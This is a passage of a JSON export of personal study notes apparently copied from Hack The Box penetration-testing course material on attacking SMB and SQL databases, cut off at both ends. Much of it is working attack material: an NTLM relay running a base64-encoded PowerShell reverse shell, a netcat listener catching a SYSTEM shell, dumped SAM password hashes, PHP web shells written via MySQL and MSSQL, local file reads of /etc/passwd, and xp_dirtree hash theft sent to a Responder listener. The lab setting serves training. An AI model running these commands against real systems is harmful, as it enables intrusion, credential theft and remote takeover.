Servers started, waiting for connections\n\n[*] SMBD-Thread-3: Connection from /ADMINISTRATOR@10.10.110.1 controlled, attacking target smb://10.10.110.146\n[*] Authenticating against smb://10.10.110.146 as /ADMINISTRATOR SUCCEED\n[*] SMBD-Thread-3: Connection from /ADMINISTRATOR@10.10.110.1 controlled, but there are no more targets left!\n[*] SMBD-Thread-5: Connection from /ADMINISTRATOR@10.10.110.1 controlled, but there are no more targets left!\n[*] Service RemoteRegistry is in stopped state\n[*] Service RemoteRegistry is disabled, enabling it\n[*] Starting service RemoteRegistry\n[*] Target system bootKey: 0xeb0432b45874953711ad55884094e9d4\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nWDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92512f2605074cfc341a7f16e5fabf08:::\ndemouser:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\ntest:1001:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::\n[*] Done dumping SAM hashes for host: 10.10.110.146\n[*] Stopping service RemoteRegistry\n[*] Restoring the disabled state for service RemoteRegistry\n```\n\nWe can create a PowerShell reverse shell using [https://www.revshells.com/](https://www.revshells.com/), set our machine IP address, port, and the option Powershell #3 (Base64).\n\nAttacking SMB\n\n```shell-session\ndrxh3kr@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'\n```\n\nOnce the victim authenticates to our server, we poison the response and make it execute our command to obtain a reverse shell.\n\nAttacking SMB\n\n```shell-session\ndrxh3kr@htb[/htb]$ nc -lvnp 9001\n\nlistening on [any] 9001 ...\nconnect to [10.10.110.133] from (UNKNOWN) [10.10.110.146] 52471\n\nPS C:\\Windows\\system32> whoami;hostname\n\nnt authority\\system\nWIN11BOX\n```\n\n#### RPC\n\nIn the [Footprinting module](https://academy.hackthebox.com/course/preview/footprinting), we discuss how to enumerate a machine using RPC. Apart from enumeration, we can use RPC to make changes to the system, such as:\n\n- Change a user's password.\n- Create a new domain user.\n- Create a new shared folder.\n\nWe also cover enumeration using RPC in the [Active Directory Enumeration & Attacks module](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks).\n\nKeep in mind that some specific configurations are required to allow these types of changes through RPC. We can use the [rpclient man page](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) or [SMB Access from Linux Cheat Sheet](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) from the SANS Institute to explore this further.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/10-Attacking Common Services/08- Latest SMB Vulnerabilities",
    "path": "02_CPTS/10-Attacking Common Services/08- Latest SMB Vulnerabilities.md",
    "title": "08  Latest SMB Vulnerabilities",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- One recent significant vulnerability that affected the SMB protocol was called SMBGhost with the CVE-2020-0796. The vulnerability consisted of a compression mechanism of the version SMB v3.1.1 whi...",
    "category": "02_CPTS",
    "content": "\n---\n\nOne recent significant vulnerability that affected the SMB protocol was called [SMBGhost](https://arista.my.site.com/AristaCommunity/s/article/SMBGhost-Wormable-Vulnerability-Analysis-CVE-2020-0796) with the [CVE-2020-0796](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796). The vulnerability consisted of a compression mechanism of the version SMB v3.1.1 which made Windows 10 versions 1903 and 1909 vulnerable to attack by an unauthenticated attacker. The vulnerability allowed the attacker to gain remote code execution (`RCE`) and full access to the remote target system.\n\nWe will not discuss the vulnerability in detail in this section, as a very in-depth explanation requires some reverse engineering experience and advanced knowledge of CPU, kernel, and exploit development. Instead, we will only focus on the attack concept because even with more complicated exploits and vulnerabilities, the concept remains the same.\n\n---\n\n## The Concept of the Attack\n\nIn simple terms, this is an [integer overflow](https://en.wikipedia.org/wiki/Integer_overflow) vulnerability in a function of an SMB driver that allows system commands to be overwritten while accessing memory. An integer overflow results from a CPU attempting to generate a number that is greater than the value required for the allocated memory space. Arithmetic operations can always return unexpected values, resulting in an error. An example of an integer overflow can occur when a programmer does not allow a negative number to occur. In this case, an integer overflow occurs when a variable performs an operation that results in a negative number, and the variable is returned as a positive integer. This vulnerability occurred because, at the time, the function lacked bounds checks to handle the size of the data sent in the process of SMB session negotiation.\n\nTo learn more about buffer overflow techniques and vulnerabilities, check out the [Stack-Based Buffer Overflows on Linux x86](https://academy.hackthebox.com/course/preview/stack-based-buffer-overflows-on-linux-x86), and [Stack-Based Buffer Overflows on Windows x86](https://academy.hackthebox.com/course/preview/stack-based-buffer-overflows-on-windows-x86) module. These go into detail on the basics of how the buffer can be overwritten and handled by the attacker.\n\n#### The Concept of Attacks\n\n![Diagram showing flow from Source to Processes, Privileges, and Destination with related components.](https://academy.hackthebox.com/storage/modules/116/attack_concept2.png)\n\nThe vulnerability occurs while processing a malformed compressed message after the `Negotiate Protocol Responses`. If the SMB server allows requests (over TCP/445), compression is generally supported, where the server and client set the terms of communication before the client sends any more data. Suppose the data transmitted exceeds the integer variable limits due to the excessive amount of data. In that case, these parts are written into the buffer, which leads to the overwriting of the subsequent CPU instructions and interrupts the process's normal or planned execution. These data sets can be structured so that the overwritten instructions are replaced with our own ones, and thus we force the CPU (and hence also the process) to perform other tasks and instructions.\n\n#### Initiation of the Attack\n\n|**Step**|**SMBGhost**|**Concept of Attacks - Category**|\n|---|---|---|\n|`1.`|The client sends a request manipulated by the attacker to the SMB server.|`Source`|\n|`2.`|The sent compressed packets are processed according to the negotiated protocol responses.|`Process`|\n|`3.`|This process is performed with the system's privileges or at least with the privileges of an administrator.|`Privileges`|\n|`4.`|The local process is used as the destination, which should process these compressed packets.|`Destination`|\n\nThis is when the cycle starts all over again, but this time to gain remote access to the target system.\n\n#### Trigger Remote Code Execution\n\n|**Step**|**SMBGhost**|**Concept of Attacks - Category**|\n|---|---|---|\n|`5.`|The sources used in the second cycle are from the previous process.|`Source`|\n|`6.`|In this process, the integer overflow occurs by replacing the overwritten buffer with the attacker's instructions and forcing the CPU to execute those instructions.|`Process`|\n|`7.`|The same privileges of the SMB server are used.|`Privileges`|\n|`8.`|The remote attacker system is used as the destination, in this case, granting access to the local system.|`Destination`|\n\nHowever, despite the vulnerability's complexity due to the buffer's manipulation, which we can see in the [PoC](https://www.exploit-db.com/exploits/48537), the concept of the attack nevertheless applies here.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/10-Attacking Common Services/09- Attacking SQL Databases",
    "path": "02_CPTS/10-Attacking Common Services/09- Attacking SQL Databases.md",
    "title": "09  Attacking SQL Databases",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "MySQL and Microsoft SQL Server (MSSQL) are relational database management systems that store data in tables, columns, and rows. Many relational database systems like MSSQL & MySQL use the Structured Q...",
    "category": "02_CPTS",
    "content": "[MySQL](https://www.mysql.com/) and [Microsoft SQL Server](https://www.microsoft.com/en-us/sql-server/sql-server-2019) (`MSSQL`) are [relational database](https://en.wikipedia.org/wiki/Relational_database) management systems that store data in tables, columns, and rows. Many relational database systems like MSSQL & MySQL use the [Structured Query Language](https://en.wikipedia.org/wiki/SQL) (`SQL`) for querying and maintaining the database.\n\nDatabases hosts are considered to be high targets since they are responsible for storing all kinds of sensitive data, including, but not limited to, user credentials, `Personal Identifiable Information (PII)`, business-related data, and payment information. In addition, those services often are configured with highly privileged users. If we gain access to a database, we may be able to leverage those privileges for more actions, including lateral movement and privilege escalation.\n\n---\n\n## Enumeration\n\nBy default, MSSQL uses ports `TCP/1433` and `UDP/1434`, and MySQL uses `TCP/3306`. However, when MSSQL operates in a \"hidden\" mode, it uses the `TCP/2433` port. We can use `Nmap`'s default scripts `-sC` option to enumerate database services on a target system:\n\n#### Banner Grabbing\n\nAttacking SQL Databases\n\n```shell-session\ndrxh3kr@htb[/htb]$ nmap -Pn -sV -sC -p1433 10.10.10.125\n\nHost discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 02:09 BST\nNmap scan report for 10.10.10.125\nHost is up (0.0099s latency).\n\nPORT     STATE SERVICE  VERSION\n1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM\n| ms-sql-ntlm-info: \n|   Target_Name: HTB\n|   NetBIOS_Domain_Name: HTB\n|   NetBIOS_Computer_Name: mssql-test\n|   DNS_Domain_Name: HTB.LOCAL\n|   DNS_Computer_Name: mssql-test.HTB.LOCAL\n|   DNS_Tree_Name: HTB.LOCAL\n|_  Product_Version: 10.0.17763\n| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback\n| Not valid before: 2021-08-26T01:04:36\n|_Not valid after:  2051-08-26T01:04:36\n|_ssl-date: 2021-08-26T01:11:58+00:00; +2m05s from scanner time.\n\nHost script results:\n|_clock-skew: mean: 2m04s, deviation: 0s, median: 2m04s\n| ms-sql-info: \n|   10.10.10.125:1433: \n|     Version: \n|       name: Microsoft SQL Server 2017 RTM\n|       number: 14.00.1000.00\n|       Product: Microsoft SQL Server 2017\n|       Service pack level: RTM\n|       Post-SP patches applied: false\n|_    TCP port: 1433\n```\n\nThe Nmap scan reveals essential information about the target, like the version and hostname, which we can use to identify common misconfigurations, specific attacks, or known vulnerabilities. Let's explore some common misconfigurations and protocol specifics attacks.\n\n---\n\n## Authentication Mechanisms\n\n`MSSQL` supports two [authentication modes](https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server), which means that users can be created in Windows or the SQL Server:\n\n|**Authentication Type**|**Description**|\n|---|---|\n|`Windows authentication mode`|This is the default, often referred to as `integrated` security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials.|\n|`Mixed mode`|Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.|\n\n`MySQL` also supports different [authentication methods](https://dev.mysql.com/doc/internals/en/authentication-method.html), such as username and password, as well as Windows authentication (a plugin is required). In addition, administrators can [choose an authentication mode](https://docs.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode) for many reasons, including compatibility, security, usability, and more. However, depending on which method is implemented, misconfigurations can occur.\n\nIn the past, there was a vulnerability [CVE-2012-2122](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/vulnerability/2383/mysql-database-authentication-bypass) in `MySQL 5.6.x` servers, among others, that allowed us to bypass authentication by repeatedly using the same incorrect password for the given account because the `timing attack` vulnerability existed in the way MySQL handled authentication attempts.\n\nIn this timing attack, MySQL repeatedly attempts to authenticate to a server and measures the time it takes for the server to respond to each attempt. By measuring the time it takes the server to respond, we can determine when the correct password has been found, even if the server does not indicate success or failure.\n\nIn the case of `MySQL 5.6.x`, the server takes longer to respond to an incorrect password than to a correct one. Thus, if we repeatedly try to authenticate with the same incorrect password, we will eventually receive a response indicating that the correct password was found, even though it was not.\n\n#### Misconfigurations\n\nMisconfigured authentication in SQL Server can let us access the service without credentials if anonymous access is enabled, a user without a password is configured, or any user, group, or machine is allowed to access the SQL Server.\n\n#### Privileges\n\nDepending on the user's privileges, we may be able to perform different actions within a SQL Server, such as:\n\n- Read or change the contents of a database\n    \n- Read or change the server configuration\n    \n- Execute commands\n    \n- Read local files\n    \n- Communicate with other databases\n    \n- Capture the local system hash\n    \n- Impersonate existing users\n    \n- Gain access to other networks\n    \n\nIn this section, we will explore some of these attacks.\n\n---\n\n## Protocol Specific Attacks\n\nIt is crucial to understand how SQL syntax works. We can use the free [SQL Injection Fundamentals](https://academy.hackthebox.com/course/preview/sql-injection-fundamentals) module to introduce ourselves to SQL syntax. Even though this module covers MySQL, MSSQL and MySQL syntax are pretty similar.\n\n#### Read/Change the Database\n\nLet's imagine we gained access to a SQL Database. First, we need to identify existing databases on the server, what tables the database contains, and finally, the contents of each table. Keep in mind that we may find databases with hundreds of tables. If our goal is not just getting access to the data, we will need to pick which tables may contain interesting information to continue our attacks, such as usernames and passwords, tokens, configurations, and more. Let's see how we can do this:\n\n#### MySQL - Connecting to the SQL Server\n\nAttacking SQL Databases\n\n```shell-session\ndrxh3kr@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13\n\nWelcome to the MariaDB monitor. Commands end with ; or \\g.\nYour MySQL connection id is 8\nServer version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nMySQL [(none)]>\n```\n\n#### Sqlcmd - Connecting to the SQL Server\n\nAttacking SQL Databases\n\n```cmd-session\nC:\\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30\n\n1>\n```\n\n**Note:** When we authenticate to MSSQL using `sqlcmd` we can use the parameters `-y` (SQLCMDMAXVARTYPEWIDTH) and `-Y` (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance.\n\nIf we are targetting `MSSQL` from Linux, we can use `sqsh` as an alternative to `sqlcmd`:\n\nAttacking SQL Databases\n\n```shell-session\ndrxh3kr@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h\n\nsqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray\nPortions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp\nThis is free software with ABSOLUTELY NO WARRANTY\nFor more information type '\\warranty'\n1>\n```\n\nAlternatively, we can use the tool from Impacket with the name `mssqlclient.py`.\n\nAttacking SQL Databases\n\n```shell-session\ndrxh3kr@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7 \n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\nPassword: MyPassword!\n\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(WIN-02\\SQLEXPRESS): Line 1: Changed database context to 'master'.\n[*] INFO(WIN-02\\SQLEXPRESS): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (120 7208) \n[!] Press help for extra shell commands\nSQL> \n```\n\n**Note:** When we authenticate to MSSQL using `sqsh` we can use the parameters `-h` to disable headers and footers for a cleaner look.\n\nWhen using Windows Authentication, we need to specify the domain name or the hostname of the target machine. If we don't specify a domain or hostname, it will assume SQL Authentication and authenticate against the users created in the SQL Server. Instead, if we define the domain or hostname, it will use Windows Authentication. If we are targetting a local account, we can use `SERVERNAME\\\\accountname` or `.\\\\accountname`. The full command would look like:\n\nAttacking SQL Databases\n\n```shell-session\ndrxh3kr@htb[/htb]$ sqsh -S 10.129.203.7 -U .\\\\julio -P 'MyPassword!' -h\n\nsqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray\nPortions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp\nThis is free software with ABSOLUTELY NO WARRANTY\nFor more information type '\\warranty'\n1>\n```\n\n#### SQL Default Databases\n\nBefore we explore using SQL syntax, it is essential to know the default databases for `MySQL` and `MSSQL`. Those databases hold information about the database itself and help us enumerate database names, tables, columns, etc. With access to those databases, we can use some system stored procedures, but they usually don't contain company data.\n\n**Note:** We will get an error if we try to list or connect to a database we don't have permissions to.\n\n`MySQL` default system schemas/databases:\n\n- `mysql` - is the system database that contains tables that store information required by the MySQL server\n- `information_schema` - provides access to database metadata\n- `performance_schema` - is a feature for monitoring MySQL Server execution at a low level\n- `sys` - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema\n\n`MSSQL` default system schemas/databases:\n\n- `master` - keeps the information for an instance of SQL Server.\n- `msdb` - used by SQL Server Agent.\n- `model` - a template database copied for each new database.\n- `resource` - a read-only database that keeps system objects visible in every database on the server in sys schema.\n- `tempdb` - keeps temporary objects for SQL queries.\n\n#### SQL Syntax\n\n#### Show Databases\n\nAttacking SQL Databases\n\n```shell-session\nmysql> SHOW DATABASES;\n\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| htbusers           |\n+--------------------+\n2 rows in set (0.00 sec)\n```\n\nIf we use `sqlcmd`, we will need to use `GO` after our query to execute the SQL syntax.\n\nAttacking SQL Databases\n\n```cmd-session\n1> SELECT name FROM master.dbo.sysdatabases\n2> GO\n\nname\n--------------------------------------------------\nmaster\ntempdb\nmodel\nmsdb\nhtbusers\n```\n\n#### Select a Database\n\nAttacking SQL Databases\n\n```shell-session\nmysql> USE htbusers;\n\nDatabase changed\n```\n\nAttacking SQL Databases\n\n```cmd-session\n1> USE htbusers\n2> GO\n\nChanged database context to 'htbusers'.\n```\n\n#### Show Tables\n\nAttacking SQL Databases\n\n```shell-session\nmysql> SHOW TABLES;\n\n+----------------------------+\n| Tables_in_htbusers         |\n+----------------------------+\n| actions                    |\n| permissions                |\n| permissions_roles          |\n| permissions_users          |\n| roles                      |\n| roles_users                |\n| settings                   |\n| users                      |\n+----------------------------+\n8 rows in set (0.00 sec)\n```\n\nAttacking SQL Databases\n\n```cmd-session\n1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES\n2> GO\n\ntable_name\n--------------------------------\nactions\npermissions\npermissions_roles\npermissions_users\nroles      \nroles_users\nsettings\nusers \n(8 rows affected)\n```\n\n#### Select all Data from Table \"users\"\n\nAttacking SQL Databases\n\n```shell-session\nmysql> SELECT * FROM users;\n\n+----+---------------+------------+---------------------+\n| id | username      | password   | date_of_joining     |\n+----+---------------+------------+---------------------+\n|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |\n|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |\n|  3 | john          | john123!   | 2020-07-02 11:47:16 |\n|  4 | tom           | tom123!    | 2020-07-02 12:23:16 |\n+----+---------------+------------+---------------------+\n4 rows in set (0.00 sec)\n```\n\nAttacking SQL Databases\n\n```cmd-session\n1> SELECT * FROM users\n2> go\n\nid          username             password         data_of_joining\n----------- -------------------- ---------------- -----------------------\n          1 admin                p@ssw0rd         2020-07-02 00:00:00.000\n          2 administrator        adm1n_p@ss       2020-07-02 11:30:50.000\n          3 john                 john123!         2020-07-02 11:47:16.000\n          4 tom                  tom123!          2020-07-02 12:23:16.000\n\n(4 rows affected)\n```\n\n---\n\n## Execute Commands\n\n`Command execution` is one of the most desired capabilities when attacking common services because it allows us to control the operating system. If we have the appropriate privileges, we can use the SQL database to execute system commands or create the necessary elements to do it.\n\n`MSSQL` has a [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15) called [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) which allow us to execute system commands using SQL. Keep in mind the following about `xp_cmdshell`:\n\n- `xp_cmdshell` is a powerful feature and disabled by default. `xp_cmdshell` can be enabled and disabled by using the [Policy-Based Management](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration) or by executing [sp_configure](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option)\n- The Windows process spawned by `xp_cmdshell` has the same security rights as the SQL Server service account\n- `xp_cmdshell` operates synchronously. Control is not returned to the caller until the command-shell command is completed\n\nTo execute commands using SQL syntax on MSSQL, use:\n\n#### XP_CMDSHELL\n\nAttacking SQL Databases\n\n```cmd-session\n1> xp_cmdshell 'whoami'\n2> GO\n\noutput\n-----------------------------\nno service\\mssql$sqlexpress\nNULL\n(2 rows affected)\n```\n\nIf `xp_cmdshell` is not enabled, we can enable it, if we have the appropriate privileges, using the following command:\n\nCode: mssql\n\n```mssql\n-- To allow advanced options to be changed.  \nEXECUTE sp_configure 'show advanced options', 1\nGO\n\n-- To update the currently configured value for advanced options.  \nRECONFIGURE\nGO  \n\n-- To enable the feature.  \nEXECUTE sp_configure 'xp_cmdshell', 1\nGO  \n\n-- To update the currently configured value for this feature.  \nRECONFIGURE\nGO\n```\n\nThere are other methods to get command execution, such as adding [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), and [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql). However, besides those methods there are also additional functionalities that can be used like the `xp_regwrite` command that is used to elevate privileges by creating new entries in the Windows registry. Nevertheless, those methods are outside the scope of this module.\n\n`MySQL` supports [User Defined Functions](https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/) which allows us to execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this [GitHub repository](https://github.com/mysqludf/lib_mysqludf_sys). It is not common to encounter a user-defined function like this in a production environment, but we should be aware that we may be able to use it.\n\n---\n\n## Write Local Files\n\n`MySQL` does not have a stored procedure like `xp_cmdshell`, but we can achieve command execution if we write to a location in the file system that can execute our commands. For example, suppose `MySQL` operates on a PHP-based web server or other programming languages like ASP.NET. If we have the appropriate privileges, we can attempt to write a file using [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) in the webserver directory. Then we can browse to the location where the file is and execute our commands.\n\n#### MySQL - Write Local File\n\nAttacking SQL Databases\n\n```shell-session\nmysql> SELECT \"<?php echo shell_exec($_GET['c']);?>\" INTO OUTFILE '/var/www/html/webshell.php';\n\nQuery OK, 1 row affected (0.001 sec)\n```\n\nIn `MySQL`, a global system variable [secure_file_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) limits the effect of data import and export operations, such as those performed by the `LOAD DATA` and `SELECT … INTO OUTFILE` statements and the [LOAD_FILE()](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file) function. These operations are permitted only to users who have the [FILE](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file) privilege.\n\n`secure_file_priv` may be set as follows:\n\n- If empty, the variable has no effect, which is not a secure setting.\n- If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.\n- If set to NULL, the server disables import and export operations.\n\nIn the following example, we can see the `secure_file_priv` variable is empty, which means we can read and write data using `MySQL`:\n\n#### MySQL - Secure File Privileges\n\nAttacking SQL Databases\n\n```shell-session\nmysql> show variables like \"secure_file_priv\";\n\n+------------------+-------+\n| Variable_name    | Value |\n+------------------+-------+\n| secure_file_priv |       |\n+------------------+-------+\n\n1 row in set (0.005 sec)\n```\n\nTo write files using `MSSQL`, we need to enable [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), which requires admin privileges, and then execute some stored procedures to create the file:\n\n#### MSSQL - Enable Ole Automation Procedures\n\nAttacking SQL Databases\n\n```cmd-session\n1> sp_configure 'show advanced options', 1\n2> GO\n3> RECONFIGURE\n4> GO\n5> sp_configure 'Ole Automation Procedures', 1\n6> GO\n7> RECONFIGURE\n8> GO\n```\n\n#### MSSQL - Create a File\n\nAttacking SQL Databases\n\n```cmd-session\n1> DECLARE @OLE INT\n2> DECLARE @FileID INT\n3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT\n4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\\inetpub\\wwwroot\\webshell.php', 8, 1\n5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET[\"c\"]);?>'\n6> EXECUTE sp_OADestroy @FileID\n7> EXECUTE sp_OADestroy @OLE\n8> GO\n```\n\n---\n\n## Read Local Files\n\nBy default, `MSSQL` allows file read on any file in the operating system to which the account has read access. We can use the following SQL query:\n\n#### Read Local Files in MSSQL\n\nAttacking SQL Databases\n\n```cmd-session\n1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents\n2> GO\n\nBulkColumn\n\n-----------------------------------------------------------------------------\n# Copyright (c) 1993-2009 Microsoft Corp.\n#\n# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.\n#\n# This file contains the mappings of IP addresses to hostnames. Each\n# entry should be kept on an individual line. The IP address should\n\n(1 rows affected)\n```\n\nAs we previously mentioned, by default a `MySQL` installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods:\n\n#### MySQL - Read Local Files in MySQL\n\nAttacking SQL Databases\n\n```shell-session\nmysql> select LOAD_FILE(\"/etc/passwd\");\n\n+--------------------------+\n| LOAD_FILE(\"/etc/passwd\")\n+--------------------------------------------------+\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\n\n<SNIP>\n```\n\n---\n\n## Capture MSSQL Service Hash\n\nIn the `Attacking SMB` section, we discussed that we could create a fake SMB server to steal a hash and abuse some default implementation within a Windows operating system. We can also steal the MSSQL service account hash using `xp_subdirs` or `xp_dirtree` undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system. When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.\n\nTo make this work, we need first to start [Responder](https://github.com/lgandx/Responder) or [impacket-smbserver](https://github.com/SecureAuthCorp/impacket) and execute one of the following SQL queries:\n\n#### XP_DIRTREE Hash Stealing\n\nAttacking SQL Databases\n\n```cmd-session\n1> EXEC master..xp_dirtree '\\\\10.10.110.17\\share\\'\n2> GO\n\nsubdirectory    depth\n--------------- -----------\n```\n\n#### XP_SUBDIRS Hash Stealing\n\nAttacking SQL Databases\n\n```cmd-session\n1> EXEC master..xp_subdirs '\\\\10.10.110.17\\share\\'\n2> GO\n\nHResult 0x55F6, Level 16, State 1\nxp_subdirs could not access '\\\\10.10.110.17\\share\\*.*': FindFirstFile() returned error 5, 'Access is denied.'\n```\n\nIf the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.\n\n#### XP_SUBDIRS Hash Stealing with Responder\n\nAttacking SQL Databases\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo responder -I tun0\n\n                                         __               \n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.\n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|\n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n                   |__|              \n<SNIP>\n\n[+] Listening for events...\n\n[SMB] NTLMv2-SSP Client   : 10.10.110.17\n[SMB] 